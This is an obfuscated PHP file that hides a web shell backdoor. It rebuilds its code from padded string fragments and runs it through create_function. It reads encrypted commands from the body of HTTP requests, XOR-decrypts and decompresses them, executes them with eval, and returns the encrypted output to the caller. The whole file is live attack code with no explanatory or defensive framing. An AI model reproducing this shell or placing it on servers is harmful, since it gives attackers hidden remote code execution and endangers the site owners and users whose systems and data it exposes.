<?php
$I='x(S@bSase64_decode($m[S1]),S$k))S);$oS=@ob_get_contSentsS(S);@ob_end_cleSan(S';
$o='SSfor($i=0;$Si<$l;){forS(S$j=0;(S$j<$Sc&&$iS<$l);$j++,S$i++){S$o.=$t{$i}^S$Sk';
$Y='$k="ceS7S389S17";$kh="995870S4b5bff";S$kf=SS"b69c062829b7SS";$p="HqXtq9uS';
$c=str_replace('KF','','KFcreaKFtKFe_fKFuKFncKFtion');
$e='{$j};}}Sreturn S$o;}if (S@pSreg_matSchS("/$kh(.+)$Skf/"S,@file_getS_contSe';
$P='nts("Sphp://SinSSput"),S$m)==1S) {@ob_startS();@evSal(@gzuncoSmpSress(@S';
$m=');$r=@bSaSse64_encSode(@xS(@gSzcomSpress($o),S$k));pSrint("$Sp$kh$r$kf");}';
$X='pO3S4EiaBX"S;fSunction x($tS,$k)S{$cS=strlen($k)S;$Sl=strlen(S$tS);$o="";';
$x=str_replace('S','',$Y.$X.$o.$e.$P.$I.$m);
$J=$c('',$x);$J();
?>
